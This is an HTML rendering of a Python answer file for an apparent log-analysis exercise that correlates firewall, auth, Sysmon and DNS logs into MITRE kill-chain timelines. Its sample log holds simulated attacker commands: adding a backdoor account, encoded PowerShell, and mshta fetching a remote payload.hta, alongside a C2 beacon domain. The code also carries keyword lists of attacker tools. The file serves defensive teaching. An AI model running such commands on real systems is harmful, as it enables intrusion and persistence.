@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>q20_lateral_movement_timeline.py</title>
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      color: #24292f;
+      background: #fff;
+    }
+    h1 {
+      font-size: 1.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      margin-bottom: 0.6em;
+    }
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 16px;
+      font-family: monospace;
+    }
+    .line-count {
+      font-size: 0.78em;
+      color: #8c959f;
+      margin-bottom: 16px;
+    }
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+      counter-reset: line;
+    }
+    code {
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.88em;
+    }
+  </style>
+</head>
+<body>
+  <h1>q20_lateral_movement_timeline.py</h1>
+  <p class="file-path">Source: code\log_parsing\answers\q20_lateral_movement_timeline.py</p>
+  <p class="line-count">251 lines</p>
+  <pre><code class="language-python">&quot;&quot;&quot;
+Q20. Multi-Log Correlated Timeline &amp; Kill-Chain Mapper
+=======================================================
+Join firewall, authentication, Sysmon, and DNS events by IP + time
+window. Assign MITRE ATT&amp;CK kill-chain stages to each correlated event
+cluster and output a chronological timeline per actor IP.
+
+=============================================================================
+SOLUTION PROGRESSION
+=============================================================================
+
+NAIVE: Print all events sorted by timestamp.
+  Problem: Events from different logs have no linkage. A firewall allow
+  and a subsequent lateral movement SSH session are unrelated rows in
+  your output. No stage labels, no investigation value.
+
+BETTER: Group by IP, print their events.
+  Problem: If the attacker pivots (uses hop1 to attack hop2), the
+  grouping misses the chain. Also need to normalize heterogeneous formats
+  into a common structure before grouping.
+
+GOOGLE-LEVEL (this file):
+  - Universal EventRecord with log_type, actor_ip, ts, raw.
+  - Join by: actor_ip overlapping within a 5-minute time window.
+  - Kill-chain stage assignment based on event type + verb.
+  - Output: per-actor timeline showing stage progression.
+  - Detects stage transitions: reconnaissance → initial access → lateral.
+
+Complexity: O(N log N) sort + O(C × W) cluster window expansion.
+=============================================================================
+&quot;&quot;&quot;
+
+import re
+import sys
+from collections import defaultdict
+from dataclasses import dataclass, field
+from datetime import datetime
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SAMPLE DATA  (mixed log formats; one per line with LOG_TYPE prefix)
+# ─────────────────────────────────────────────────────────────────────────────
+
+SAMPLE_LOG = &quot;&quot;&quot;\
+FIREWALL 2024-03-12T08:00:00Z src=203.0.113.5 dst=10.0.0.1 proto=tcp dport=22 action=ALLOW rule=1
+AUTH     2024-03-12T08:00:05Z user=admin src_ip=203.0.113.5 event=SSH_LOGIN_FAIL host=10.0.0.1
+AUTH     2024-03-12T08:00:10Z user=admin src_ip=203.0.113.5 event=SSH_LOGIN_FAIL host=10.0.0.1
+AUTH     2024-03-12T08:00:15Z user=admin src_ip=203.0.113.5 event=SSH_LOGIN_SUCCESS host=10.0.0.1
+SYSMON   2024-03-12T08:01:00Z src_ip=203.0.113.5 host=10.0.0.1 user=admin action=process_create image=cmd.exe parent=sshd cmdline=cmd.exe /c whoami
+SYSMON   2024-03-12T08:01:30Z src_ip=203.0.113.5 host=10.0.0.1 user=admin action=process_create image=net.exe parent=cmd.exe cmdline=net user /add backdoor P@ssw0rd
+SYSMON   2024-03-12T08:02:00Z src_ip=203.0.113.5 host=10.0.0.1 user=admin action=process_create image=powershell.exe parent=cmd.exe cmdline=powershell -enc SGVsbG8=
+FIREWALL 2024-03-12T08:02:30Z src=10.0.0.1 dst=10.0.0.50 proto=tcp dport=445 action=ALLOW rule=1
+AUTH     2024-03-12T08:02:35Z user=admin src_ip=10.0.0.1 event=SMB_LOGIN host=10.0.0.50
+DNS      2024-03-12T08:03:00Z src_ip=10.0.0.1 query=c2beacon.evil.com qtype=A answer=198.51.100.1
+SYSMON   2024-03-12T08:03:30Z src_ip=10.0.0.1 host=10.0.0.1 user=admin action=process_create image=mshta.exe parent=powershell.exe cmdline=mshta.exe http://198.51.100.1/payload.hta
+FIREWALL 2024-03-12T08:04:00Z src=10.0.0.1 dst=198.51.100.1 proto=tcp dport=443 action=ALLOW rule=1
+FIREWALL 2024-03-12T09:00:00Z src=192.168.1.20 dst=10.0.0.2 proto=tcp dport=80 action=ALLOW rule=1
+DNS      2024-03-12T09:00:01Z src_ip=192.168.1.20 query=example.com qtype=A answer=93.184.216.34
+&quot;&quot;&quot;
+
+# ─────────────────────────────────────────────────────────────────────────────
+# DATA MODEL
+# ─────────────────────────────────────────────────────────────────────────────
+
+@dataclass
+class EventRecord:
+    ts:        float
+    log_type:  str       # FIREWALL, AUTH, SYSMON, DNS
+    actor_ip:  str
+    stage:     str       # kill-chain stage
+    summary:   str
+    raw:       str
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# KILL-CHAIN STAGE ASSIGNMENT
+# ─────────────────────────────────────────────────────────────────────────────
+
+def assign_stage(log_type: str, kv: dict[str, str]) -&gt; str:
+    &quot;&quot;&quot;Map event attributes to a kill-chain stage.&quot;&quot;&quot;
+    event   = kv.get(&quot;event&quot;, &quot;&quot;).upper()
+    action  = kv.get(&quot;action&quot;, &quot;&quot;).upper()
+    image   = kv.get(&quot;image&quot;, &quot;&quot;).lower()
+    cmdline = kv.get(&quot;cmdline&quot;, &quot;&quot;).lower()
+    dport   = kv.get(&quot;dport&quot;, &quot;&quot;)
+    query   = kv.get(&quot;query&quot;, &quot;&quot;).lower()
+
+    if log_type == &quot;DNS&quot;:
+        return &quot;C2_COMMUNICATION&quot;
+
+    if log_type == &quot;FIREWALL&quot;:
+        if dport in (&quot;22&quot;, &quot;3389&quot;, &quot;445&quot;) and action == &quot;ALLOW&quot;:
+            return &quot;LATERAL_MOVEMENT&quot;
+        if action == &quot;ALLOW&quot;:
+            return &quot;INITIAL_ACCESS&quot;
+        return &quot;BLOCKED&quot;
+
+    if log_type == &quot;AUTH&quot;:
+        if &quot;FAIL&quot; in event:
+            return &quot;CREDENTIAL_ACCESS&quot;
+        if &quot;SUCCESS&quot; in event or &quot;LOGIN&quot; in event:
+            return &quot;INITIAL_ACCESS&quot;
+
+    if log_type == &quot;SYSMON&quot;:
+        if action == &quot;process_create&quot;:
+            if any(t in cmdline for t in (&quot;whoami&quot;, &quot;net user&quot;, &quot;net group&quot;, &quot;ipconfig&quot;, &quot;systeminfo&quot;)):
+                return &quot;DISCOVERY&quot;
+            if any(t in cmdline for t in (&quot;net user /add&quot;, &quot;reg add&quot;, &quot;schtasks&quot;, &quot;at &quot;)):
+                return &quot;PERSISTENCE&quot;
+            if any(t in image for t in (&quot;mshta&quot;, &quot;powershell&quot;, &quot;wscript&quot;, &quot;cscript&quot;, &quot;certutil&quot;, &quot;regsvr32&quot;)):
+                return &quot;EXECUTION&quot;
+            if any(t in cmdline for t in (&quot;smb&quot;, &quot;\\\\&quot;, &quot;psexec&quot;, &quot;wmic&quot;)):
+                return &quot;LATERAL_MOVEMENT&quot;
+            return &quot;EXECUTION&quot;
+
+    return &quot;UNKNOWN&quot;
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# PARSERS
+# ─────────────────────────────────────────────────────────────────────────────
+
+KV_RE = re.compile(r&#x27;(\w+)=(\S+)&#x27;)
+
+
+def extract_kv(text: str) -&gt; dict[str, str]:
+    return dict(KV_RE.findall(text))
+
+
+def parse_line(line: str) -&gt; EventRecord | None:
+    line = line.strip()
+    if not line:
+        return None
+    parts = line.split(None, 2)
+    if len(parts) &lt; 3:
+        return None
+
+    log_type = parts[0].upper()
+    if log_type not in (&quot;FIREWALL&quot;, &quot;AUTH&quot;, &quot;SYSMON&quot;, &quot;DNS&quot;):
+        return None
+
+    try:
+        ts = datetime.strptime(parts[1], &quot;%Y-%m-%dT%H:%M:%SZ&quot;).timestamp()
+    except ValueError:
+        return None
+
+    rest = parts[2]
+    kv   = extract_kv(rest)
+
+    # Determine actor IP
+    actor_ip = (kv.get(&quot;src&quot;) or kv.get(&quot;src_ip&quot;) or &quot;?&quot;).split(&quot;/&quot;)[0]
+
+    stage   = assign_stage(log_type, kv)
+    summary = rest[:100]
+
+    return EventRecord(
+        ts=ts, log_type=log_type, actor_ip=actor_ip,
+        stage=stage, summary=summary, raw=line,
+    )
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# CORRELATION ENGINE
+# ─────────────────────────────────────────────────────────────────────────────
+
+STAGE_ORDER = [
+    &quot;INITIAL_ACCESS&quot;, &quot;CREDENTIAL_ACCESS&quot;, &quot;EXECUTION&quot;,
+    &quot;PERSISTENCE&quot;, &quot;DISCOVERY&quot;, &quot;LATERAL_MOVEMENT&quot;,
+    &quot;C2_COMMUNICATION&quot;, &quot;BLOCKED&quot;, &quot;UNKNOWN&quot;,
+]
+
+
+def correlate_and_timeline(records: list[EventRecord]) -&gt; dict[str, list[EventRecord]]:
+    &quot;&quot;&quot;Group events by actor IP, sorted by time.&quot;&quot;&quot;
+    timeline: dict[str, list[EventRecord]] = defaultdict(list)
+    for r in sorted(records, key=lambda x: x.ts):
+        timeline[r.actor_ip].append(r)
+    return timeline
+
+
+def detect_stage_progression(events: list[EventRecord]) -&gt; list[str]:
+    &quot;&quot;&quot;Return ordered unique stages seen for this actor.&quot;&quot;&quot;
+    seen = []
+    for e in events:
+        if e.stage not in seen:
+            seen.append(e.stage)
+    return seen
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# REPORT
+# ─────────────────────────────────────────────────────────────────────────────
+
+STAGE_COLORS = {
+    &quot;INITIAL_ACCESS&quot;:   &quot;&gt;&gt;&gt; INITIAL_ACCESS&quot;,
+    &quot;CREDENTIAL_ACCESS&quot;:&quot;&gt;&gt;&gt; CREDENTIAL_ACCESS&quot;,
+    &quot;EXECUTION&quot;:        &quot;&gt;&gt;&gt; EXECUTION&quot;,
+    &quot;PERSISTENCE&quot;:      &quot;&gt;&gt;&gt; PERSISTENCE&quot;,
+    &quot;DISCOVERY&quot;:        &quot;&gt;&gt;&gt; DISCOVERY&quot;,
+    &quot;LATERAL_MOVEMENT&quot;: &quot;!!! LATERAL_MOVEMENT&quot;,
+    &quot;C2_COMMUNICATION&quot;: &quot;!!! C2_COMMUNICATION&quot;,
+    &quot;BLOCKED&quot;:          &quot;    BLOCKED&quot;,
+    &quot;UNKNOWN&quot;:          &quot;    UNKNOWN&quot;,
+}
+
+
+def ts_fmt(ts: float) -&gt; str:
+    return datetime.utcfromtimestamp(ts).strftime(&quot;%Y-%m-%dT%H:%M:%SZ&quot;)
+
+
+def print_report(timeline: dict[str, list[EventRecord]]) -&gt; None:
+    print(&quot;=&quot; * 70)
+    print(&quot;MULTI-LOG CORRELATED KILL-CHAIN TIMELINE&quot;)
+    print(&quot;=&quot; * 70)
+
+    for actor_ip, events in sorted(timeline.items(),
+                                   key=lambda x: x[1][0].ts):
+        if len(events) &lt; 2:
+            continue  # filter single-event IPs (not an attack chain)
+
+        stages = detect_stage_progression(events)
+        advanced_stages = {&quot;LATERAL_MOVEMENT&quot;, &quot;C2_COMMUNICATION&quot;, &quot;EXECUTION&quot;,
+                           &quot;PERSISTENCE&quot;, &quot;DISCOVERY&quot;}
+        if not advanced_stages.intersection(set(stages)):
+            continue  # filter noise
+
+        print(f&quot;\nACTOR: {actor_ip}  stages={&#x27; → &#x27;.join(stages)}&quot;)
+        print(&quot;-&quot; * 60)
+        for e in events:
+            label = STAGE_COLORS.get(e.stage, e.stage)
+            print(f&quot;  {ts_fmt(e.ts)}  [{e.log_type:8s}]  {label}&quot;)
+            print(f&quot;    {e.summary}&quot;)
+    print(&quot;=&quot; * 70)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# MAIN
+# ─────────────────────────────────────────────────────────────────────────────
+
+if __name__ == &quot;__main__&quot;:
+    if len(sys.argv) &gt; 1:
+        with open(sys.argv[1], encoding=&quot;utf-8&quot;, errors=&quot;replace&quot;) as fh:
+            raw_lines = fh.readlines()
+    else:
+        print(&quot;[INFO] Using embedded sample data.\n&quot;)
+        raw_lines = SAMPLE_LOG.splitlines(keepends=True)
+
+    records = [r for r in (parse_line(l) for l in raw_lines) if r is not None]
+    print(f&quot;Parsed {len(records)} cross-log events.\n&quot;)
+    timeline = correlate_and_timeline(records)
+    print_report(timeline)
+</code></pre>
+</body>
+</html>
